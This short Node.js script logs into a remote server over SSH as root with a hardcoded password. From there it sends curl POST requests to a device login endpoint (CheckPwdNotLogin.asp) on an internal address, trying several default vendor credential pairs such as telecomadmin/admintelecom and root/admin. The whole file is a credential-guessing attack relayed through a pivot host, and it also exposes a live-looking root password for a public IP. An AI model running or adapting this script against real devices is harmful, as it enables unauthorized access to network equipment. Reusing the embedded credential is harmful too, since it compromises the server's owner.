import { Client } from 'ssh2';

const conn = new Client();
conn.on('ready', () => {
  const cmd = `
    # Probar con Epadmin
    curl -s -k -X POST https://172.19.61.5:80/asp/CheckPwdNotLogin.asp?1=1 \\
      -d "UserNameInfo=Epadmin&NormalPwdInfo=adminEp"
    echo ""
    # Probar con telecomadmin
    curl -s -k -X POST https://172.19.61.5:80/asp/CheckPwdNotLogin.asp?1=1 \\
      -d "UserNameInfo=telecomadmin&NormalPwdInfo=admintelecom"
    echo ""
    # Probar con root
    curl -s -k -X POST https://172.19.61.5:80/asp/CheckPwdNotLogin.asp?1=1 \\
      -d "UserNameInfo=root&NormalPwdInfo=admin"
    echo ""
  `;
  conn.exec(cmd, (err, stream) => {
    let out = '';
    stream.on('data', d => out += d);
    stream.on('close', () => {
      console.log('CheckPwdNotLogin outputs:\n' + out);
      conn.end();
    });
  });
}).connect({
  host: '2.25.241.239',
  port: 22,
  username: 'root',
  password: 'CloudWare1991@'
});
